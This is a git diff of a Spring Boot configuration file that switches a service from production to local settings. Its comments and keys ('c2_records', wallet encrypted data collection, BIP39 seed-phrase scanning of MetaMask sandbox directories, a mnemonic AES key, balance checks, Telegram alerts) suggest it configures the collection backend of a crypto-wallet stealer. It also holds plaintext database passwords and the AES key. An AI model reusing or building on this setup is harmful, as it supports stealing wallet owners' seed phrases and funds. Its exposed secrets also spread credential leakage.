@@ -22,9 +22,9 @@ spring:
     nacos:
       discovery:
         server-addr: http://127.0.0.1:8848
-        namespace: a5b3bd13-9c96-4216-93fb-8b077e537f46 #测试1
+        #namespace: a5b3bd13-9c96-4216-93fb-8b077e537f46 #测试1
         #namespace: 0e71ca2d-2a33-48c1-922a-5d388210e675 #测试2
-        #namespace: 31ee03b7-c6df-436d-990d-d6c08aa5c20a #开发
+        namespace: 31ee03b7-c6df-436d-990d-d6c08aa5c20a #开发
   mvc:
     pathmatch:
       matching-strategy: ant_path_matcher
@@ -39,33 +39,33 @@ spring:
   redis:
     host: 127.0.0.1
     port: 6379
-    password: 123456
+    #password: 123456
     database: 0
     timeout: 5000ms
     lettuce:
       pool:
-        max-active: 64
-        max-idle: 32
-        min-idle: 8
+        max-active: 32
+        max-idle: 16
+        min-idle: 4
         max-wait: 5000ms
     jedis:
       pool:
-        max-active: 96
-        max-idle: 48
-        min-idle: 12
+        max-active: 32
+        max-idle: 16
+        min-idle: 4
 
   datasource:
     driver-class-name: com.mysql.cj.jdbc.Driver
-    #url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8
-    #username: root
-    #password: Root@123
     url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8
-    username: ioslianjie
-    password: BAF4R22mwenXXxEH
+    username: root
+    password: Root@123
+    #url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8
+    #username: ioslianjie
+    #password: BAF4R22mwenXXxEH
     type: com.alibaba.druid.pool.DruidDataSource
-    initialSize: 16
-    minIdle: 16
-    maxActive: 80
+    initialSize: 10
+    minIdle: 10
+    maxActive: 56
     maxWait: 5000
     timeBetweenEvictionRunsMillis: 30000
     minEvictableIdleTimeMillis: 50000
@@ -78,15 +78,15 @@ spring:
 
 consumer:
   # 落盘根
-  #upload-dir: D:/c2_records
-  upload-dir: /opt/news4/data/apilog
+  upload-dir: D:/c2_records
+  #upload-dir: /opt/news4/data/apilog
   #图片落盘位置
-  #photo-dir: D:/c2_records/photos
-  photo-dir: /opt/news4/data/photos
+  photo-dir: D:/c2_records/photos
+  #photo-dir: /opt/news4/data/photos
   photo-url-prefix: data/photos
   #钱包加密数据落盘位置
-  #waitbound-dir: "D:/c2_records/waitbound"
-  waitbound-dir: /opt/news4/data/waitbound
+  waitbound-dir: "D:/c2_records/waitbound"
+  #waitbound-dir: /opt/news4/data/waitbound
   waitbound-task-enabled: true #是否开启加密信息收集
   waitbound-threads: 2
   waitbound-poll-interval-ms: 800
@@ -100,7 +100,7 @@ consumer:
   # sandbox 全目录 BIP39 兜底扫描（metamask 等）默认关
   sandbox-fallback-regex-enabled: false
   main-threads: 4
-  parse-ci-threads: 4
+  parse-ci-threads: 6
   auto-claim-idle-ms: 1800000
   main-claim-idle-ms: 600000
   max-attempts: 5
@@ -109,7 +109,7 @@ consumer:
   # 助记词 AES 密钥：留空或空字符串 → mnemonic.result 明文入库
   mnemonic-aes-key: "Mn3m0n1c@2024!SecureKey#news2"
   news4-task-enabled: true
-  news4-threads: 12
+  news4-threads: 8
   news4-poll-interval-ms: 300
   news4-claim-idle-ms: 600000
   photo-threads: 3
@@ -179,13 +179,13 @@ queue:
 # news4 旁路线程池（与 n4-worker 隔离；listen / balance 互不堵塞）
 news4:
   listen-pool:
-    core-size: 8
-    max-size: 16
-    queue-capacity: 20000
+    core-size: 6
+    max-size: 12
+    queue-capacity: 10000
   balance-pool:
-    core-size: 8
-    max-size: 24
-    queue-capacity: 20000
+    core-size: 6
+    max-size: 16
+    queue-capacity: 10000
 
 #飞机消息线程池（突发时队列加大；并发仍限流防刷爆 TG）
 telegram-msg-stream:
